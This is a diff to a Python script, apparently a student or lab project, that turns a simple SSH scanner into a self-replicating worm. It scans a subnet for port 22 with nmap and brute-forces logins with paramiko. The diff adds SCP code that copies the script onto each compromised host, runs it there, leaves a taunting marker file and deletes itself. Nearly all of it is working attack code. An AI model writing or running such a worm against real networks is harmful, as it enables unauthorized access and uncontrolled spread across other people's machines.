@@ -3,11 +3,12 @@
 import nmap
 import paramiko
 import sys
+from scp import SCPClient
 
 #defining the variable that calls the port scanner function : nmap
 nmScan = nmap.PortScanner()
 #defining the local subnet and the target port
-nmScan.scan('192.168.197.0/24', '22')
+nmScan.scan('10.0.0.0/24', '22')
 #initializing cmd line method
 nmScan.command_line()
 #defining a list for the hosts on the subnet
@@ -32,13 +33,18 @@ for element in networkhosts:
         for pword in passwords:
             username = user
             password = pword
-            command = "mkdir Wormy; cd ~/Wormy; touch 'WormyWasHere'"
+            #bash code: execute the self-replica, create tracks, delete code once execution complete
+            command = "./WormyTheWorm && touch 'WormyWuzHere' && echo 'Haha no code for you :)' > WormyWuzHere && rm WormyTheWorm"
             #initializing paramiko ssh client by defining the ssh variable
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             try:
                 #try to connect to ssh with a user and password combo
                 ssh.connect(host, port, username, password, timeout=5)
+                scp = SCPClient(ssh.get_transport())
+                #transport python code onto target
+                scp.put(sys.argv[0])
+                #execute bash commands on target machine
                 stdin, stdout, stderr = ssh.exec_command(command)
                 print(host + ' Success :)')
             except:
